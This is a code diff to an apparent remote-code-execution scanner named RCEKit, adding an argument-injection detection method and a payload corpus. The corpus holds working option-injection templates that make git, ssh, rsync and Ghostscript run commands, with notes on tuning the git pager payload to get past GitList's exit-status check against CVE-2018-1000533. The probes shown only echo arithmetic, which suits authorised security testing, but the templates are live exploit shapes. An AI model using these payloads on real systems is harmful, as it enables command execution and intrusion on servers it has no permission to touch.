@@ -46,7 +46,7 @@ def configure_logging() -> None:
 
 # Bump on every change: PATCH for fixes, MINOR for new capabilities, MAJOR for
 # breaking changes to the CLI, output formats, or template schema.
-__version__ = "3.6.1"
+__version__ = "3.7.0"
 
 SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}
 
@@ -862,6 +862,11 @@ class RCEKit:
         # Format probes for the deserialization-sink method, declared in the
         # corpus so an ecosystem can be added without touching Python.
         self.deser_probes: Dict[str, Dict[str, Any]] = {}
+        # Option shapes that make a spawned binary run a command of its own,
+        # for the argv method. Declared in the corpus for the same reason the
+        # bridges are: the catalogue is the part that grows, and growing it
+        # should not need Python.
+        self.argv_primitives: Dict[str, Dict[str, Any]] = {}
         self._load_template_payloads()
 
         # Encoding and obfuscation techniques.
@@ -942,6 +947,7 @@ class RCEKit:
             self.eval_carriers = data.get("eval_carriers", {})
             self.bridges = data.get("bridges", {})
             self.deser_probes = data.get("deser_probes", {})
+            self.argv_primitives = data.get("argv_primitives", {})
         except Exception as exc:
             message = f"unable to parse {self.template_path}: {exc}"
             logger.error("%s", message)
@@ -968,6 +974,7 @@ class RCEKit:
             self.eval_carriers = data.get("eval_carriers", {})
             self.bridges = data.get("bridges", {})
             self.deser_probes = data.get("deser_probes", {})
+            self.argv_primitives = data.get("argv_primitives", {})
         except Exception as exc:  # pragma: no cover — a build-time guarantee
             message = f"unable to parse the built-in payload corpus: {exc}"
             logger.error("%s", message)
@@ -6527,6 +6534,145 @@ class LookupCallback(DetectionMethod):
         return Verdict("negative", "no lookup callback received for any probe")
 
 
+class ArgvInjection(DetectionMethod):
+    """A sink that spawns a program with **no shell**, where the injected value
+    becomes one of its arguments.
+
+    Every rung in :data:`SINK_SHAPE_RUNGS` assumes a separator or a quote
+    break-out can work. Here none can, and not because the input is filtered:
+    the application is doing the correct thing. GitList's
+    ``escapeshellarg($query)`` quotes the value exactly as the manual says, so
+    ``;``, ``|``, ``&&`` and ``$()`` all arrive at ``git grep`` as literal
+    characters inside one argument. What it cannot do is stop that argument
+    being read as an *option*, and ``git``'s ``--open-files-in-pager=`` names a
+    command git then runs. The payload is not a command with a break-out in
+    front of it; it is an option, and the program's own parser is the vector.
+
+    **Why this is a method and not a carrier.** The query-language bridges are
+    carriers -- they wrap the same core and ride inside ``reflected``, ``time``
+    and ``oob``. This could have been built that way, and was not, because of
+    what the report would then say. ``reflected``'s finding prints as
+    ``[reflected/<environment>/...]``, which asserts a shell of that family ran
+    the input. On an argv sink no shell ran the input: a program parsed it and
+    chose to run something. Printing that under ``reflected`` would name the
+    wrong class, which is the exact error 3.0.1 removed a probe shape for. A
+    separate name also lets an operator who knows the sink is argv ask only
+    that question.
+
+    **The oracle is unchanged, and that is the point.** The option names a
+    command, so the command is the arithmetic core every results-based probe
+    here already uses, and :meth:`_confirm_computed` decides it against the
+    payload-free control exactly as it does for ``reflected``. A new vector
+    needed no new definition of proof.
+
+    **In-band only, deliberately, in this first version.** A blind argv sink is
+    real and common -- an image converter spawned on an upload renders nothing
+    -- and reaching it means carrying an out-of-band core instead of an
+    arithmetic one. That is a small change to :meth:`build_probes` and no change
+    at all to this class's shape, and it is left out because there is no target
+    to prove it against: the catalogue's one validated entry confirms in band.
+    A path shipped without a case that exercises it is a claim the bench cannot
+    reproduce, which this project treats as worse than a missing feature.
+
+    The catalogue lives in the corpus (``argv_primitives``) rather than here, so
+    an option shape can be added without touching Python -- the seam the bridges
+    and the eval carriers already use. Every shipped entry is a **single argv
+    element**: ``-oProxyCommand=x`` rather than ``-o ProxyCommand=x``, because a
+    sink that hands the value over as one argument is the shape that makes this
+    class reachable at all, and a two-element option silently tests nothing
+    there."""
+    name = "argv"
+    tier = "executed"
+    safety = "safe"
+
+    def _selected(self, sink_env: str) -> List[Tuple[str, Dict[str, Any]]]:
+        """``(name, primitive)`` for each selected option shape this dialect can
+        carry.
+
+        ``auto`` takes the whole catalogue. An unknown name raises rather than
+        narrowing the run silently, for the reason :meth:`_selected_bridges`
+        gives: a typo that selects nothing would report a clean negative from a
+        run that injected no option at all."""
+        wanted = self.config.get("argv_binaries") or ()
+        if not wanted:
+            return []
+        declared: Dict[str, Any] = getattr(self.gen, "argv_primitives", None) or {}
+        if tuple(wanted) == ("auto",):
+            names = list(declared)
+        else:
+            # Selectable by primitive name or by the binary it targets, because
+            # an operator reading a stack trace knows `git`, not `git_pager`.
+            names, unknown = [], []
+            for want in wanted:
+                if want in declared:
+                    names.append(want)
+                    continue
+                matched = [n for n, spec in declared.items()
+                           if want in (spec.get("binaries") or ())]
+                if matched:
+                    names.extend(matched)
+                else:
+                    unknown.append(want)
+            if unknown:
+                binaries = sorted({b for spec in declared.values()
+                                   for b in (spec.get("binaries") or ())})
+                raise ValueError(
+                    f"unknown argv binary/primitive: {', '.join(unknown)}; choose from "
+                    f"auto, {', '.join(sorted(declared))}, or a binary name "
+                    f"({', '.join(binaries)})")
+        allowed = self.config.get("max_safety") or "intrusive"
+        out: List[Tuple[str, Dict[str, Any]]] = []
+        for name in dict.fromkeys(names):
+            spec = declared[name]
+            if (spec.get("sink_env") or "unix") != sink_env:
+                continue
+            if SAFETY_ORDER.get(spec.get("safety") or "safe", 0) > SAFETY_ORDER.get(allowed, 1):
+                continue
+            out.append((name, spec))
+        return out
+
+    def applicable(self, record: "PayloadRecord") -> bool:
+        # Gated on the operator naming a binary, not on a risk rung: until one
+        # is named there is nothing to build, and saying which tier to raise
+        # would answer a question nobody asked.
+        return (record.environment in SHELL_CAPABLE_ENVIRONMENTS
+                and bool(self._selected(self._sink_env(record))))
+
+    def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
+        a = rng.randint(100000, 999999)
+        b = rng.randint(100000, 999999)
+        total = a + b
+        t1, t2 = self._tag(rng), self._tag(rng)
+        # The same core `reflected` builds, for the same reason: the option
+        # names a command, and arithmetic on operands random to this probe is
+        # the thing reflection cannot produce.
+        arith = f"$(({a}+{b}))"
+        core = f"echo {t1}{arith}{t2}"
+        probes: List[Probe] = []
+        for name, spec in self._selected(self._sink_env(record)):
+            template = str(spec.get("template", ""))
+            if "__CMD__" not in template:
+                # Dropped unsent rather than sent as-is: a probe with nowhere
+                # to put the command can never confirm, and an unconfirmable
+                # probe still counts toward the coverage the run reports.
+                continue
+            body = template.replace("__CMD__", core)
+            # No separator and no break-out. There is no running command in
+            # front of this value to terminate -- the value *is* an argument --
+            # so the bare option is the probe, arrived at structurally rather
+            # than by flag. The context still applies: it is what carries the
+            # option through JSON, XML or a form on the way in.
+            if self._context_swallows(record, body):
+                continue
+            probes.append(Probe(payload=self._wrap_context(record, body),
+                                expected=f"{t1}{total}{t2}", forbidden=arith,
+                                carrier=name))
+        return probes
+
+    def confirm(self, obs: "Observation", probe: "Probe") -> Verdict:
+        return self._confirm_computed(obs, probe)
+
+
 class BooleanDifferential(DetectionMethod):
     """A sink that **evaluates** a predicate and renders nothing of it.
 
@@ -7387,6 +7533,7 @@ DETECTION_METHODS = {
     LookupCallback.name: LookupCallback,
     DeserSink.name: DeserSink,
     BooleanDifferential.name: BooleanDifferential,
+    ArgvInjection.name: ArgvInjection,
 }
 
 # Methods one probe of which buys an answer. Derived, so a method added later
@@ -9795,6 +9942,10 @@ def main(argv: Optional[List[str]] = None) -> int:
                              "read from a response-shape differential across randomised true/false "
                              "predicates — reaches evaluation-sink, never executed, because a query engine "
                              "comparing two numbers produces the same differential). "
+                             "argv (argument injection into a program spawned with NO shell: the "
+                             "value becomes one of its arguments and an option it names runs a "
+                             "command, so every separator is inert and reflected reaches nothing "
+                             "— needs --argv-binary, reaches executed). "
                              "Opt-in and additive: when omitted, verification keeps its existing behaviour "
                              "unchanged.")
     parser.add_argument("--detect-json", default=None, metavar="PATH",
@@ -9892,6 +10043,16 @@ def main(argv: Optional[List[str]] = None) -> int:
                              "Off by default because a bridge payload is SQL or XML syntax: on an "
                              "ordinary shell sink it is a request that cannot confirm. A stateful "
                              "bridge also needs --verify-active-risk stateful.")
+    parser.add_argument("--argv-binary", default=None, metavar="NAMES",
+                        help="(--methods argv) Which spawned program's options to inject: none "
+                             "(default), auto, a primitive name from the corpus 'argv_primitives' "
+                             "section, or the binary it targets (git, ssh, rsync, gs). --methods "
+                             "argv builds nothing until one is named, because the option that "
+                             "makes a program run a command is specific to that program. Use it "
+                             "when the value reaches a binary as one of its ARGUMENTS and no "
+                             "shell is involved -- a sink where escapeshellarg did its job and "
+                             "every separator is inert, so reflected comes back negative on a "
+                             "target that is exploitable.")
     parser.add_argument("--observe-url", default=None, metavar="URL",
                         help="(--methods) Second-order execution: an endpoint POLLED for the "
                              "computed value after the probes are sent. Use it when execution "
@@ -10000,6 +10161,10 @@ def main(argv: Optional[List[str]] = None) -> int:
         sink_env = parse_sink_env(from_profile(args.sink_env, "sink_env"))
         write_langs = parse_write_langs(from_profile(args.write_lang, "write_lang"))
         bridges = parse_bridges(from_profile(args.bridges, "bridges"))
+        # Parsed by the same function: both name corpus entries, both are off
+        # by default, and both must refuse a typo rather than narrow the run to
+        # nothing and call the result clean.
+        argv_binaries = parse_bridges(from_profile(args.argv_binary, "argv_binary"))
         deser_formats = _parse_name_list(from_profile(args.deser_formats, "deser_formats"))
     except ValueError as exc:
         print(f"[!] {exc}")
@@ -10367,6 +10532,7 @@ def main(argv: Optional[List[str]] = None) -> int:
                                 "observe_data": observe_data,
                                 "observe_headers": observe_headers,
                                 "bridges": bridges,
+                                "argv_binaries": argv_binaries,
                                 "deser_formats": deser_formats,
                                 # The bridges honour the same safety ordering as
                                 # every corpus payload, so a stateful bridge is
@@ -11806,6 +11972,51 @@ EMBEDDED_PAYLOAD_CORPUS = r"""
       "cleanup": null,
       "notes": "The expect:// stream wrapper executes its URI through a shell and yields the output as the entity's value, so a document that renders the entity returns the command output directly. The extension is rarely installed, which is exactly why this is opt-in rather than part of a default run.",
       "verified": "not validated here; documented behaviour of the PHP expect stream wrapper"
+    }
+  },
+  "argv_primitives": {
+    "git_pager": {
+      "binaries": ["git"],
+      "shape": "option-names-a-command",
+      "sink_env": "unix",
+      "safety": "safe",
+      "template": "--open-files-in-pager=echo rk:rk:1:$(__CMD__) #",
+      "requires": [
+        "the value reaches a git subcommand as one argv element, in option position",
+        "git grep finds at least one match, since the pager only opens when it has a file to page"
+      ],
+      "notes": "git runs its pager through `sh -c` and appends the path it would have paged. Three things in this template were measured against vulhub gitlist/CVE-2018-1000533 rather than reasoned, and each one is the difference between confirming and reporting a clean negative on a target that executes. (1) The trailing `#` comments out that appended path. The published write-ups use `;`, which leaves the path as a bare command: git then exits 255, and an application that checks the exit status -- GitList catches the RuntimeException and returns false -- throws the output away, so the command runs and nothing comes back. (2) The output imitates git grep's own `tree:file:line:match` format, because whatever consumes this pager's stdout is an application parsing git grep output: GitList matches `([\\w-._]+):([^:]+):([0-9]+):(.+)` and renders group 4, so a bare line reaches it and is dropped. (3) The command is run in a substitution so its stdout lands in that fourth field. This is the clearest statement of why the argv method exists: `escapeshellarg` quotes the value correctly, every shell metacharacter is inert, and a separator-based method reaches nothing while the value still lands where git reads options.",
+      "verified": "confirmed executed against vulhub gitlist/CVE-2018-1000533"
+    },
+    "ssh_proxycommand": {
+      "binaries": ["ssh", "scp", "sftp"],
+      "shape": "option-names-a-command",
+      "sink_env": "unix",
+      "safety": "safe",
+      "template": "-oProxyCommand=__CMD__",
+      "requires": ["the value reaches ssh as one argv element, before the destination"],
+      "notes": "ProxyCommand is run through `sh -c` to open the connection, so it executes before any authentication is attempted and needs no reachable host. Written without a space after -o so the whole option is a single argv element; `-o ProxyCommand=...` needs the sink to split, which the single-element shapes here do not assume.",
+      "verified": "not validated here; documented ssh_config behaviour"
+    },
+    "rsync_rsh": {
+      "binaries": ["rsync"],
+      "shape": "option-names-a-command",
+      "sink_env": "unix",
+      "safety": "safe",
+      "template": "--rsh=__CMD__",
+      "requires": ["the value reaches rsync as one argv element, and the transfer names a remote path"],
+      "notes": "--rsh is the long form of -e and takes the command rsync uses to reach a remote shell. The equals form keeps it to one argv element. It only fires when rsync decides the transfer is remote, which is the narrower prerequisite recorded above.",
+      "verified": "not validated here; documented rsync behaviour"
+    },
+    "gs_output_pipe": {
+      "binaries": ["gs", "ghostscript"],
+      "shape": "option-names-a-pipe-or-file",
+      "sink_env": "unix",
+      "safety": "safe",
+      "template": "-sOutputFile=%pipe%__CMD__",
+      "requires": ["the value reaches ghostscript as one argv element, in option position"],
+      "notes": "%pipe% tells Ghostscript to open its output device as a pipe to the named command, which it runs through a shell. This is argument injection rather than the better-known Ghostscript bugs, which are -dSAFER escapes carried in PostScript *file content* and so are not reachable from an argv element at all.",
+      "verified": "not validated here; documented Ghostscript output-device behaviour"
     }
   },
   "deser_probes": {
